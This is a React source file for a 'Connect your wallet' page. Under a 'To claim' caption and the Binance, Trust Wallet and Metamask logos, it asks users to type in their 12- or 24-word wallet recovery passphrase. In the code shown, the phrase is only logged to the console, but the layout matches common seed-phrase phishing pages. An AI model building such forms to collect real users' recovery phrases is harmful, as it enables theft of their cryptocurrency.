import React, { useState } from 'react'
import * as yup from 'yup'
import DOptionCard from '../app/DOptionCard'
import { DIcon } from '../app/DIcon'
import { DTextField } from '../app/DTextField'
import AuthFormHeader from './AuthFormHeader'
import BinanceLogo from '../../assets/binance.png'
import TrustWalletLogo from '../../assets/trust-wallet.png'
import MetamaskLogo from '../../assets/metamask-logo.png'

const cardOptions = [
  {
    id: 1,
    name: 'New Wallet',
    icon: 'wallet-plus'
  },
  {
    id: 2,
    name: 'Import wallet',
    icon: 'wallet'
  }
]

const walletProviders = [
  { id: 1, name: 'Binance chain wallet', logo: BinanceLogo },
  { id: 2, name: 'Trust wallet', logo: TrustWalletLogo },
  { id: 3, name: 'Metamask wallet', logo: MetamaskLogo }
]

const fieldValidators = {
  walletPassphrase: yup.string().required()
}

const SelectWallet = ({selectedProvider, onSelectProvider }) => {
  const [isSelectProviderModalInView, setIsSelectProviderModalInView] = useState(false)

  function handleWalletProviderSelection (el) {
    onSelectProvider(el)
    setIsSelectProviderModalInView(false)
  }

  return (
    <div className="max-w-lg">
      <p className={`text-sm mb-2 font-semibold text-opacity-70 ${Object.keys(selectedProvider).length > 0 ? 'text-app-zero-gravity' : 'text-gray-600'}`}>
        Select Wallet Provider
      </p>
      <div className={`border rounded flex items-center py-2 px-3 bg-white cursor-pointer ${Object.keys(selectedProvider).length > 0 ? 'border-app-zero-gravity border border-opacity-50' : ''}`} onClick={() => setIsSelectProviderModalInView(true)}>
        <DIcon name="wallet" className={`text-2xl text-gray-400 mr-2 ${Object.keys(selectedProvider).length > 0 ? 'text-app-zero-gravity text-opacity-80' : ''}`} />
        <p className={`text-gray-500 truncate text-sm ${Object.keys(selectedProvider).length > 0 ? 'text-app-zero-gravity font-medium text-opacity-90' : ''}`}> { selectedProvider.name || 'Click to select a wallet provider' } </p>
      </div>

      { isSelectProviderModalInView && (<div className="fixed w-full h-screen max-h-screen overflow-auto bg-black z-10 top-0 left-0 bg-opacity-30 flex items-center justify-center">
        <div className="bg-white max-w-xl w-11/12 rounded-xl">
          <div className="flex items-center justify-between py-6 px-8 border-b border-purple-50">
            <h2 className="font-semibold text-app-zeus-purple text-lg sm:text-xl">
              Select a wallet provider
            </h2>
            <DIcon name="close" className="text-app-zero-gravity text-xl hover:bg-gray-200 px-2 py-1 rounded-md cursor-pointer transition-colors"  onClick={() => setIsSelectProviderModalInView(false)}/>
          </div>

          <div className="py-4">
            { walletProviders.map( el => (<div key={el.id} className="flex cursor-pointer items-center justify-between px-6 py-1 border group hover:bg-app-zero-gravity my-4 rounded-md w-11/12 mx-auto transition-colors" onClick={() => handleWalletProviderSelection(el)}>
              <p className="font-medium text-app-zero-gravity group-hover:text-white transition-colors">
                {el.name}
              </p>
              <img src={el.logo} alt="logo" className="h-10" />
            </div>))}
          </div>

        </div>
      </div>)}
    </div>
  )
}

const CreatNewWallet = ({ onGenerateNewAddress }) => {
  return (
    <section>
      <button className="flex items-center justify-center bg-app-zeus-purple rounded-full py-2 px-8 text-white text-sm font-medium gap-3" onClick={onGenerateNewAddress}>
        <DIcon name="qrcode" className="text-xl" />
        <span>
          Generate New Address
        </span>
      </button>
    </section>
  )
}

const ImportWallet = ({ walletPassphrase, onFieldValueChange,onConnectWallet }) => {
  const [ isSubmitAttemptMade, setIsSubmitAttemptMade ] = useState(false)

  function handleClick() {
    setIsSubmitAttemptMade(true)
    onConnectWallet()
  }

  return (
    <section className="max-w-lg">
      <DTextField
        label="Wallet Passphrase"
        icon="qrcode"
        height="h-36"
        name="walletPassphrase"
        validation={fieldValidators.walletPassphrase}
        checkError={isSubmitAttemptMade}
        setFieldValue={onFieldValueChange}
        value={walletPassphrase}
        errorMessage="Passphrase should be at least 12 words separated by spaces"
        placeholder="e.g book ram egg tree ..."
        hint="Typically 12 (sometimes 24) words separated by spaces"
      />

      <button className="flex items-center justify-center bg-app-zeus-purple rounded-full py-2 px-8 text-white text-sm font-medium gap-3" onClick={handleClick}>
        <DIcon name="qrcode" className="text-xl" />
        <span>
          Connect wallet
        </span>
      </button>
    </section>
  )
} 

export const ConnectWallet = () => {
  const [currentCardOptionId, setCurrentCardOptionId] = useState(1)
  const [ selectedWalletProvider, setSelectedWalletProvider ] = useState({})
  const [ walletPassphrase, setWalletPassphrase ] = useState({
    walletPassphrase: ''
  })

  function generateNewAddress() {
    console.log(selectedWalletProvider)
  }

  function connectUserWallet () {
    console.log({
      selectedWalletProvider,
      walletPassphrase
    })
  }

  return (
    <main className="lg:py-16 py-3 xl:px-16 lg:px-6 mx-auto lg:mx-0 max-w-xl lg:max-w-full">
      <AuthFormHeader
        title="Connect your wallet"
        caption="To claim, please provide the preferred cryptocurrency 
        wallet address by connecting your wallet"  
      />

      <section className="mt-10 px-5 sm:px-8 flex items-start gap-5 sm:gap-10">
        { cardOptions.map(el => <DOptionCard key={el.id} cardOption={el} isCardActive={el.id === currentCardOptionId} onClick={() => setCurrentCardOptionId(el.id)} />) }
      </section>

      <section className="mt-10 md:mt-16 px-5">
        <SelectWallet selectedProvider={selectedWalletProvider} onSelectProvider={(walletProvider) => { setSelectedWalletProvider(walletProvider) }} />
      </section>

      <section className="mt-5 px-5">
        { currentCardOptionId === 1 
          ? <CreatNewWallet 
              onGenerateNewAddress={generateNewAddress}
            />  
          : <ImportWallet 
              walletPassphrase={walletPassphrase.walletPassphrase}
              onFieldValueChange={(passphrase) => setWalletPassphrase(passphrase)}
              onConnectWallet={connectUserWallet}
            /> 
        }
      </section>
    </main>
  )
}
